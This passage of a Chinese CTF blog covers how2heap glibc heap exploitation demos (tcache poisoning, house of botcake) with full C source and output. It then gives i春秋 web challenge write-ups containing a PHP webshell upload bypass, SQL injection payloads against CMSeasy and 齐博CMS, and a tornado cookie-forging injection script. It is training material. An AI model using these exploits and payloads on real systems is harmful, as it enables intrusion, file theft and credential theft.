attack涉及的原理是一样的。那么我们希望覆盖_IO_list_all为main_arena+88，只需要令old_top-&gt;bk = io_list_all-0x10即可，其中io_list_all表示_IO_list_all的地址。但问题在于，用于覆盖的值main_arena+88不是我们可控的值，因此我们期望能控制其fd指针。 已知下一个文件指针位于文件指针地址+0x68处，这恰好对应于smallbin[4]，存放大小为90-98之间的small chunk。如果我们设置old top的大小为0x61，然后申请一个小块使得old top不会被分配出去，那么它就会进入到smallbin[4]中，成为链表头，同时也成为了我们伪造的文件指针的fd指针。 然后用old top伪造文件指针，满足这几个条件： 12345678910111213/* 1. Set mode to 0: fp-&gt;_mode &lt;= 0*/fp-&gt;_mode = 0; // top+0xc0/* 2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base*/fp-&gt;_IO_write_base = (char *) 2; // top+0x20fp-&gt;_IO_write_ptr = (char *) 3; // top+0x28 最后，覆盖_IO_jump_t[3]也就是_IO_OVERFLOW使其指向winner函数，或者说system函数。 calc_tcache_size源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;malloc.h&gt;struct malloc_chunk { size_t mchunk_prev_size; /* Size of previous chunk (if free). */ size_t mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;};/* The corresponding word size. */#define SIZE_SZ (sizeof (size_t))#define MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \\ ? __alignof__ (long double) : 2 * SIZE_SZ)/* The corresponding bit mask value. */#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)/* The smallest possible chunk */#define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))/* The smallest size we can malloc is an aligned minimal chunk */#define MINSIZE \\ (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))#define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE) ? \\ MINSIZE : \\ ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)/* When &quot;x&quot; is from chunksize(). */# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)/* When &quot;x&quot; is a user-provided size. */# define usize2tidx(x) csize2tidx (request2size (x))int main(){ unsigned long long req; unsigned long long tidx; fprintf(stderr, &quot;This file doesn't demonstrate an attack, but calculates the tcache idx for a given chunk size.\\n&quot;); fprintf(stderr, &quot;The basic formula is as follows:\\n&quot;); fprintf(stderr, &quot;\\t(IDX = CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT\\n&quot;); fprintf(stderr, &quot;\\tOn a 64 bit system the current values are:\\n&quot;); fprintf(stderr, &quot;\\t\\tMINSIZE: 0x%lx\\n&quot;, MINSIZE); fprintf(stderr, &quot;\\t\\tMALLOC_ALIGNMENT: 0x%lx\\n&quot;, MALLOC_ALIGNMENT); fprintf(stderr, &quot;\\tSo we get the following equation:\\n&quot;); fprintf(stderr, &quot;\\t(IDX = CHUNKSIZE - 0x%lx) / 0x%lx\\n\\n&quot;, MINSIZE-MALLOC_ALIGNMENT+1, MALLOC_ALIGNMENT); fprintf(stderr, &quot;BUT be AWARE that CHUNKSIZE is not the x in malloc(x)\\n&quot;); fprintf(stderr, &quot;It is calculated as follows:\\n&quot;); fprintf(stderr, &quot;\\tIF x &lt; MINSIZE(0x%lx) CHUNKSIZE = MINSIZE (0x%lx)\\n&quot;, MINSIZE, MINSIZE); fprintf(stderr, &quot;\\tELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) \\n&quot;); fprintf(stderr, &quot;\\t=&gt; CHUNKSIZE = (x + 0x%lx + 0x%lx) &amp; ~0x%lx)\\n\\n\\n&quot;, SIZE_SZ, MALLOC_ALIGN_MASK, MALLOC_ALIGN_MASK); while(1) { fprintf(stderr, &quot;[CTRL-C to exit] Please enter a size x (malloc(x)) in hex (e.g. 0x10): &quot;); scanf(&quot;%llx&quot;, &amp;req); tidx = usize2tidx(req); if (tidx &gt; 63) { fprintf(stderr, &quot;\\nWARNING: NOT IN TCACHE RANGE!\\n&quot;); } fprintf(stderr, &quot;\\nTCache Idx: %llu\\n&quot;, tidx); } return 0;} 输出： 12345678910111213141516171819This file doesn't demonstrate an attack, but calculates the tcache idx for a given chunk size.The basic formula is as follows: (IDX = CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT On a 64 bit system the current values are: MINSIZE: 0x20 MALLOC_ALIGNMENT: 0x10 So we get the following equation: (IDX = CHUNKSIZE - 0x11) / 0x10BUT be AWARE that CHUNKSIZE is not the x in malloc(x)It is calculated as follows: IF x &lt; MINSIZE(0x20) CHUNKSIZE = MINSIZE (0x20) ELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) =&gt; CHUNKSIZE = (x + 0x8 + 0xf) &amp; ~0xf)[CTRL-C to exit] Please enter a size x (malloc(x)) in hex (e.g. 0x10): 0x10TCache Idx: 0 关于tcache介绍可以参考这里。 这个例子说明了tcache的索引是如何分配的，需要注意的是CHUNKSIZE是经过request2size转化后的大小，也就是chunk的实际大小。tcache索引IDX可以由上面的公式得到。 tcache_dup源码： 1234567891011121314151617181920#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){ fprintf(stderr, &quot;This file demonstrates a simple double-free attack with tcache.\\n&quot;); fprintf(stderr, &quot;Allocating buffer.\\n&quot;); int *a = malloc(8); fprintf(stderr, &quot;malloc(8): %p\\n&quot;, a); fprintf(stderr, &quot;Freeing twice...\\n&quot;); free(a); free(a); fprintf(stderr, &quot;Now the free list has [ %p, %p ].\\n&quot;, a, a); fprintf(stderr, &quot;Next allocated buffers will be same: [ %p, %p ].\\n&quot;, malloc(8), malloc(8)); return 0;} 输出： 123456This file demonstrates a simple double-free attack with tcache.Allocating buffer.malloc(8): 0x1a90260Freeing twice...Now the free list has [ 0x1a90260, 0x1a90260 ].Next allocated buffers will be same: [ 0x1a90260, 0x1a90260 ]. 和fastbin类似，tcache也存在double free，而且还没有链表头检查，因此只需要连续两次free就好了，更加简单。 tcache_poisoning源码： 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;int main(){ fprintf(stderr, &quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\\n&quot; &quot;returning a pointer to an arbitrary location (in this case, the stack).\\n&quot; &quot;The attack is very similar to fastbin corruption attack.\\n\\n&quot;); size_t stack_var; fprintf(stderr, &quot;The address we want malloc() to return is %p.\\n&quot;, (char *)&amp;stack_var); fprintf(stderr, &quot;Allocating 1 buffer.\\n&quot;); intptr_t *a = malloc(128); fprintf(stderr, &quot;malloc(128): %p\\n&quot;, a); fprintf(stderr, &quot;Freeing the buffer...\\n&quot;); free(a); fprintf(stderr, &quot;Now the tcache list has [ %p ].\\n&quot;, a); fprintf(stderr, &quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\\n&quot; &quot;to point to the location to control (%p).\\n&quot;, sizeof(intptr_t), a, &amp;stack_var); a[0] = (intptr_t)&amp;stack_var; fprintf(stderr, &quot;1st malloc(128): %p\\n&quot;, malloc(128)); fprintf(stderr, &quot;Now the tcache list has [ %p ].\\n&quot;, &amp;stack_var); intptr_t *b = malloc(128); fprintf(stderr, &quot;2nd malloc(128): %p\\n&quot;, b); fprintf(stderr, &quot;We got the control\\n&quot;); return 0;} 输出： 123456789101112131415This file demonstrates a simple tcache poisoning attack by tricking malloc intoreturning a pointer to an arbitrary location (in this case, the stack).The attack is very similar to fastbin corruption attack.The address we want malloc() to return is 0x7ffd4941b420.Allocating 1 buffer.malloc(128): 0x1601260Freeing the buffer...Now the tcache list has [ 0x1601260 ].We overwrite the first 8 bytes (fd/next pointer) of the data at 0x1601260to point to the location to control (0x7ffd4941b420).1st malloc(128): 0x1601260Now the tcache list has [ 0x7ffd4941b420 ].2nd malloc(128): 0x7ffd4941b420We got the control 和fastbin_dup_into_stack类似，改写已经free掉的chunk的fd指向栈上地址，然后malloc两次即可分配到栈上。 tcache_house_of_spirit源码： 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){ fprintf(stderr, &quot;This file demonstrates the house of spirit attack on tcache.\\n&quot;); fprintf(stderr, &quot;It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\\n&quot;); fprintf(stderr, &quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\\n&quot;); fprintf(stderr, &quot;(Search for strings \\&quot;invalid next size\\&quot; and \\&quot;double free or corruption\\&quot;)\\n\\n&quot;); fprintf(stderr, &quot;Ok. Let's start with the example!.\\n\\n&quot;); fprintf(stderr, &quot;Calling malloc() once so that it sets up its memory.\\n&quot;); malloc(1); fprintf(stderr, &quot;Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\\n&quot;); unsigned long long *a; //pointer that will be overwritten unsigned long long fake_chunks[10]; //fake chunk region fprintf(stderr, &quot;This region contains one fake chunk. It's size field is placed at %p\\n&quot;, &amp;fake_chunks[1]); fprintf(stderr, &quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\\n&quot;); fprintf(stderr, &quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \\n&quot;); fake_chunks[1] = 0x40; // this is the size fprintf(stderr, &quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\\n&quot;, &amp;fake_chunks[1]); fprintf(stderr, &quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\\n&quot;); a = &amp;fake_chunks[2]; fprintf(stderr, &quot;Freeing the overwritten pointer.\\n&quot;); free(a); fprintf(stderr, &quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\\n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[2]); fprintf(stderr, &quot;malloc(0x30): %p\\n&quot;, malloc(0x30));} 输出： 1234567891011121314151617This file demonstrates the house of spirit attack on tcache.It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.(Search for strings &quot;invalid next size&quot; and &quot;double free or corruption&quot;)Ok. Let's start with the example!.Calling malloc() once so that it sets up its memory.Let's imagine we will overwrite 1 pointer to point to a fake chunk region.This region contains one fake chunk. It's size field is placed at 0x7ffe46748fb8This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffe46748fb8.... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.Freeing the overwritten pointer.Now the next malloc will return the region of our fake chunk at 0x7ffe46748fb8, which will be 0x7ffe46748fc0!malloc(0x30): 0x7ffe46748fc0 依然非常简单。相比传统house of spirit，tcache中不会检查被释放的chunk的下一个chunk的chunk_size字段。那么我们只要保证fake chunk本身的大小合法（实际上就是位于small bin范围内）就可以了。随后将fake chunk的mem指针赋值给a，free(a)就将fake chunk放进了tcache，再次malloc即可拿到fake chunk。 house_of_botcake源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;int main(){ /* * This attack should bypass the restriction introduced in * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d * If the libc does not include the restriction, you can simply double free the victim and do a * simple tcache poisoning */ // disable buffering and make _FILE_IO does not interfere with our heap setbuf(stdin, NULL); setbuf(stdout, NULL); // introduction puts(&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;); puts(&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;); puts(&quot;This attack only relies on double free.\\n&quot;); // prepare the target intptr_t stack_var[4]; puts(&quot;The address we want malloc() to return, namely,&quot;); printf(&quot;the target address is %p.\\n\\n&quot;, stack_var); // prepare heap layout puts(&quot;Preparing heap layout&quot;); puts(&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;); intptr_t *x[7]; for(int i=0; i&lt;sizeof(x)/sizeof(intptr_t*); i++){ x[i] = malloc(0x100); } puts(&quot;Allocating a chunk for later consolidation&quot;); intptr_t *prev = malloc(0x100); puts(&quot;Allocating the victim chunk.&quot;); intptr_t *a = malloc(0x100); printf(&quot;malloc(0x100): a=%p.\\n&quot;, a); puts(&quot;Allocating a padding to prevent consolidation.\\n&quot;); malloc(0x10); // cause chunk overlapping puts(&quot;Now we are able to cause chunk overlapping&quot;); puts(&quot;Step 1: fill up tcache list&quot;); for(int i=0; i&lt;7; i++){ free(x[i]); } puts(&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;); free(a); puts(&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;); free(prev); puts(&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\\n&quot;); malloc(0x100); /*VULNERABILITY*/ free(a);// a is already freed /*VULNERABILITY*/ // simple tcache poisoning puts(&quot;Launch tcache poisoning&quot;); puts(&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;); intptr_t *b = malloc(0x120); puts(&quot;We simply overwrite victim's fwd pointer&quot;); b[0x120/8-2] = (long)stack_var; // take target out puts(&quot;Now we can cash out the target chunk.&quot;); malloc(0x100); intptr_t *c = malloc(0x100); printf(&quot;The new chunk is at %p\\n&quot;, c); // sanity check assert(c==stack_var); printf(&quot;Got control on target/stack!\\n\\n&quot;); // note puts(&quot;Note:&quot;); puts(&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;); puts(&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;); return 0;} 输出： 123456789101112131415161718192021222324252627282930This file demonstrates a powerful tcache poisoning attack by tricking malloc intoreturning a pointer to an arbitrary location (in this demo, the stack).This attack only relies on double free.The address we want malloc() to return, namely,the target address is 0x7ffd2845e850.Preparing heap layoutAllocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.Allocating a chunk for later consolidationAllocating the victim chunk.malloc(0x100): a=0xcffae0.Allocating a padding to prevent consolidation.Now we are able to cause chunk overlappingStep 1: fill up tcache listStep 2: free the victim chunk so it will be added to unsorted binStep 3: free the previous chunk and make it consolidate with the victim chunk.Step 4: add the victim chunk to tcache list by taking one out from it and free victim againLaunch tcache poisoningNow the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunkWe simply overwrite victim's fwd pointerNow we can cash out the target chunk.The new chunk is at 0x7ffd2845e850Got control on target/stack!Note:And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victimIn that case, once you have done this exploitation, you can have many arbitary writes very easily. 首先用7个0x100的chunk填满tcache，再次申请0x100的chunk a并释放就只能进入unsorted bin。如果它上一个chunk同样是0x100并且也被释放，那么它们就会合并。 现在从tcache中取出一个chunk，然后double free掉a，a就进入了tcache。然后我们申请一个大于0x100的chunk使得tcache无法满足申请，从而从unsorted bin中取出刚才合并好的chunk，构成堆块重叠，修改a的fd为栈上地址，malloc两次即可分配到栈上。","link":"/post/How2heap/"},{"title":"i 春秋 Web 入门练习 Part I.","text":"i春秋上的题都是比赛真题，所以会比较有意思，也更复杂一些。 爆破-1123456789&lt;?phpinclude &quot;flag.php&quot;;$a = @$_REQUEST['hello'];if(!preg_match('/^\\w*$/',$a )){ die('ERROR');}eval(&quot;var_dump($$a);&quot;);show_source(__FILE__);?&gt; 要求参数hello为纯字母，又看到eval(var_dump($$a));语句，可以想到使用$GLOBALS打印出所有变量，payload： 1?hello=GLOBALS 等等，好像没爆破啊？感觉是非预期解。 爆破-212345&lt;?phpinclude &quot;flag.php&quot;;$a = @$_REQUEST['hello'];eval( &quot;var_dump($a);&quot;);show_source(__FILE__); 提示flag不在变量中，那么只能直接读flag.php文件了，payload： 1?hello=file('flag.php') 另一种payload则类似注入： 1?hello=);show_source(‘flag.php’);// 爆破-3123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(0);session_start();require('./flag.php');if(!isset($_SESSION['nums'])){ $_SESSION['nums'] = 0; $_SESSION['time'] = time(); $_SESSION['whoami'] = 'ea';}if($_SESSION['time']+120&lt;time()){ session_destroy();}$value = $_REQUEST['value'];$str_rand = range('a', 'z');$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];if($_SESSION['whoami']==($value[0].$value[1]) &amp;&amp; substr(md5($value),5,4)==0){ $_SESSION['nums']++; $_SESSION['whoami'] = $str_rands; echo $str_rands;}if($_SESSION['nums']&gt;=10){ echo $flag;}show_source(__FILE__);?&gt; 首先如果cookie中不设置nums会给whoami设置默认值ea，且session只能维持120ms，所以应该需要用脚本跑。 接下来，如果whoami和传入的value相同，且value的MD5值子串为0，那么nums就加1，whoami更新为两个新的随机字母。后一个条件可以很容易地用数组绕过。 我们尝试传入value=ea，果然显示了whoami的下一个值。脚本： 12345678910import requestsurl = 'http://4451e735c9e046bcb09a4404756ca952c586da682cfe47b9.changame.ichunqiu.com/?value[]=ea'ss = requests.session()r = ss.get(url)for i in range(10): r = ss.get(url[:-2] + r.text[0:2]) print(r.text[:50]) 需要注意的是所有请求都要维持在同一session下。 这题终于有点爆破的意思了。 Upload尝试上传php一句话木马，发现过滤了&lt;?和php，对前者利用&lt;script&gt;绕过，后者则大写绕过。payload： 123&lt;script language=&quot;PHP&quot;&gt; eval($_POST['ant']);&lt;/script&gt; 上传getshell，在上级目录得到flag.php。 Code题目链接中含有?jpg=hei.jpg，猜测可能可以通过这个读文件，尝试?jpg=index.php，F12得到base64后的源代码，解码： 1234567891011121314151617181920212223&lt;?php/** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */header('content-type:text/html;charset=utf-8');if(! isset($_GET['jpg'])) header('Refresh:0;url=./index.php?jpg=hei.jpg');$file = $_GET['jpg'];echo '&lt;title&gt;file:'.$file.'&lt;/title&gt;';$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);$file = str_replace(&quot;config&quot;,&quot;_&quot;, $file);$txt = base64_encode(file_get_contents($file));echo &quot;&lt;img src='data:image/gif;base64,&quot;.$txt.&quot;'&gt;&lt;/img&gt;&quot;;/* * Can you find the flag file? * */?&gt; 注意这里会对file进行过滤，将非数字/字母删除，并将config换成_，但是我们并不知道我们要读的文件是什么。 这时可以注意到注释：Created by PhpStorm，猜想是.idea泄漏，因此访问/.idea/workspace.xml，可以发现文件fl3g_ichuqiu.php。由于_不是数字或字母，我们应用上述规则访问fl3gconfigichuqiu.php： 1index.php?jpg=fl3gconfigichuqiu.php 解码得到： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?php/** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */error_reporting(E_ALL || ~E_NOTICE);include('config.php');function random($length, $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz') { $hash = ''; $max = strlen($chars) - 1; for($i = 0; $i &lt; $length; $i++) { $hash .= $chars[mt_rand(0, $max)]; } return $hash;}function encrypt($txt,$key){ for($i=0;$i&lt;strlen($txt);$i++){ $tmp .= chr(ord($txt[$i])+10); } $txt = $tmp; $rnd=random(4); $key=md5($rnd.$key); $s=0; for($i=0;$i&lt;strlen($txt);$i++){ if($s == 32) $s = 0; $ttmp .= $txt[$i] ^ $key[++$s]; } return base64_encode($rnd.$ttmp);}function decrypt($txt,$key){ $txt=base64_decode($txt); $rnd = substr($txt,0,4); $txt = substr($txt,4); $key=md5($rnd.$key); $s=0; for($i=0;$i&lt;strlen($txt);$i++){ if($s == 32) $s = 0; $tmp .= $txt[$i]^$key[++$s]; } for($i=0;$i&lt;strlen($tmp);$i++){ $tmp1 .= chr(ord($tmp[$i])-10); } return $tmp1;}$username = decrypt($_COOKIE['user'],$key);if ($username == 'system'){ echo $flag;}else{ setcookie('user',encrypt('guest',$key)); echo &quot;╮(╯▽╰)╭&quot;;}?&gt; 先不管加解密过程，只看最后几行主程序：将cookie中的user通过key解密，如果得到明文为system则成功，否则将返回guest经过key加密后的密文。显然后者是我们获得key值的关键。 然后关注加密过程：先将每个字符的ASCII码加10得到新的txt，随后随机生成4个字符rnd与key拼接后进行MD5，得到新key。将新txt与新key按字符异或得到ttmp，若txt的长度超出key则在key后继续拼接key。最后，返回rnd拼接上ttmp后的base64值就是密文。 附python2脚本（python3中的byte和str转换可能导致错误结果）： 12345678910111213141516171819202122232425262728293031323334import requestsimport base64url = 'http://036fb8c596914fd18ad96399893a61dd9da80da355bf450e.changame.ichunqiu.com/fl3g_ichuqiu.php'cookie = requests.get(url).cookies['user']txt = base64.b64decode(cookie)rnd = txt[:4]ttmp = txt[4:]key = list('aaaaaa')guest = list('guest')system = list('system')for i in range(5): guest[i] = chr(ord(guest[i]) + 10)for i in range(5): key[i] = chr(ord(ttmp[i]) ^ ord(guest[i]))for i in range(6): system[i] = chr(ord(system[i]) + 10)cookies = []for c in '1234567890abcdef': # md5 key[5] = c ttnew = '' for i in range(6): ttnew += chr(ord(key[i]) ^ ord(system[i])) cookies.append(base64.b64encode(rnd + ttnew))for i in cookies: cookie = {'user': i} r = requests.get(url=url, cookies=cookie) print r.text 这题才应该叫爆破。。最后其实是爆破key的第6位才出的结果。 YeserCMS进入CMS乱点一波发现是从cmseasy，网上查到了无限制报错注入漏洞。 仿照漏洞payload来进行注入，POST数据： 1xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx',(updatexml(1,concat(0x7e,mid((select group_concat(concat(database())) ),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt; 得到数据库名Yeser。 1xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx',(updatexml(1,concat(0x7e,mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt; 这里由于长度无法显示所有表，可以修改1,32的1来查看后续表，我们需要的是yesercms_user。 1xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx',(updatexml(1,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name='yesercms_user'),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt; 这里也会有许多列，我们需要的是username和password。 1xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx',(updatexml(1,concat(0x7e,mid((select concat(username,password) from yesercms_user),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt; 这里的password显示不全，同样修改1,32的1来查看完整的MD5值：ff512d4240cbbdeafada404677ccbe61。解密得到密码：Yeser231。登录并进入后台管理页面。 管理页面内容很多，但是都没有什么注入点。最终，在模板-&gt;当前模板编辑中发现，编辑模板时会先读取相应的文件。因此我们任选一个文件，点击编辑并抓包，将唯一的参数id修改为想读取的文件。经测试，这里应该是../../flag.php。 XSS平台尝试注入无果，构造非法参数pass=bbb&amp;email[]=aaa得到报错信息，其中有一行： 1File &quot;/var/www/html/rtiny/login.py&quot;, line 20, in post 结合题目名，得知这是使用RTiny编写的XSS平台，项目地址在这里。其中，rtiny/lock.py存在SQL注入漏洞，post方法中对username没有任何过滤： 123456789101112131415161718192021222324#!/usr/bin/env python# -*- coding:utf-8 -*-__author__ = 'r0ker'import tornado.webfrom function import md5import dbfrom config import URLclass LockHandler(tornado.web.RequestHandler): def get(self): self.set_secure_cookie(&quot;lock&quot;,'1') self.render(&quot;lock.html&quot;) def post(self): username = self.get_secure_cookie(&quot;username&quot;) or '' passwd = md5(self.get_argument('password', '')) row = db.ct(&quot;manager&quot;, &quot;*&quot;, &quot;username='&quot; + username + &quot;' and password='&quot; + passwd + &quot;'&quot;) if row: self.set_secure_cookie(&quot;lock&quot;, &quot;0&quot;) self.redirect(&quot;http://&quot; + URL) else: self.redirect(&quot;http://&quot; + URL + &quot;/lock&quot;) 而set_secure_cookie方法来自tornado，该方法使用一个cookie_secret来加密cookie。我们可以在index.py中发现这个cookie_secret： 123456settings = { &quot;static_path&quot;: os.path.join(os.path.dirname(__file__), &quot;themes/static&quot;), &quot;template_path&quot;: os.path.join(os.path.dirname(__file__), &quot;themes&quot;), &quot;cookie_secret&quot;: &quot;M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=&quot;, &quot;login_url&quot;: &quot;/login&quot;,} 所以，我们在注入的时候，只需要将payload用cookie_secret加密即可。借助tornado写个脚本： 123456789101112131415161718192021222324import tornado.webimport tornado.ioloopsettings = { 'cookie_secret': 'M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc='}class MainHandler(tornado.web.RequestHandler): def get(self): self.write('aaa') # self.set_secure_cookie('username', &quot;' and updatexml(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#&quot;) # self.set_secure_cookie('username', &quot;' and updatexml(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='manager'),0x7e),1)#&quot;) # self.set_secure_cookie('username', &quot;' and updatexml(1,concat(0x7e, (select group_concat(username,'||',password,'||',email) from manager),0x7e),1)#&quot;) self.set_secure_cookie('username', &quot;' and updatexml(1,concat(0x7e, mid((select group_concat(username,'||',password,'||',email) from manager),30,40),0x7e),1)#&quot;) self.write(self.get_secure_cookie('username'))def makeapp(): return tornado.web.Application([ (r'/index', MainHandler), ], **settings)app = makeapp()app.listen(8089)tornado.ioloop.IOLoop.instance().start() 浏览器访问本机8089端口，在返回头Set-Cookie中得到加密后的注入语句，带着这个cookie访问网页的/lock（而不是/login）。在爆用户名、密码和邮箱时，显示长度有限制，因此需要分两次用mid截取，最终得到用户名、密码和邮箱为： 1ichuqiu||318a61264482e503090facfc4337207f||545 密码经过MD5解密得到：Myxss623。登录在后台发现f13g_ls_here.txt文件，继续通过注入读取该文件。将代码中set_secure_cookie的第二个参数改为： 1&quot;' and updatexml(1,concat(0x7e, (select load_file('/var/www/html/fl3g_ls_here.txt')),0x7e),1)#&quot; 然后故技重施，由于长度限制只得到一部分flag，再修改payload： 1&quot;' and updatexml(1,concat(0x7e, mid((select load_file('/var/www/html/f13g_ls_here.txt')),30,40),0x7e),1)#&quot; 即可得到第二部分。 再见CMS根据登录页面页脚可以判断出该CMS为齐博CMS。漏洞参考，很巧妙地利用了转义进行SQL注入。 根据参考的文章，先注册一个用户，然后去会员中心修改个人信息，可以看到表单中每一项对应什么参数。然后构造payload： 1/member/userinfo.php?job=edit&amp;step=2 POST数据： 1truename=xxxx%0000&amp;Limitword[000]=&amp;email=123456@qq.com&amp;provinceid=,address=(select database()) where uid=3# 首先uid对应自己账户的uid，在个人信息处可以在url中看到。注入的具体原理参考“漏洞参考”文章，注入点是参数provinceid，注意不是address。 这样可以在个人信息页面的“联系地址”一栏得到数据库名blog。接下来爆表名： 1truename=xxxx%0000&amp;Limitword[000]=&amp;email=123456@qq.com&amp;provinceid=,address=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where uid=3# 我们关心的是表admin。爆列名，注意单双引号会被转义所以不能使用，可以用十六进制绕过： 1truename=xxxx%0000&amp;Limitword[000]=&amp;email=123456@qq.com&amp;provinceid=,address=(select group_concat(column_name) from information_schema.columns where table_name=0x61646d696e) where uid=3# 爆用户名和密码： 1truename=xxxx%0000&amp;Limitword[000]=&amp;email=123456@qq.com&amp;provinceid=,address=(select group_concat(username,0x7e,password) from admin) where uid=3# 得到用户名admin，密码MD52638127c92b79ee7901195382dc08068，普通MD5网站解不出来，在https://hashkiller.co.uk/Cracker和http://www.chamd5.org/上破解出来是4b10b488e4c8，但是用这个密码登录不了，可能方向错了吧。 无奈只能扫下目录发现flag.php，然后利用SQL读文件： 1truename=xxxx%0000&amp;Limitword[000]=&amp;email=123456@qq.com&amp;provinceid=,address=(select load_file(0x2f7661722f7777772f68746d6c2f666c61672e706870)) where uid=3# 发现联系地址这次变成了空白，F12得到flag.php源码从而得到flag。 SQL过滤了很多关键字，绕过技巧是用&lt;&gt;来分割： 1id=1 o&lt;&gt;rder by 1 发现by 4的时候无回显但by 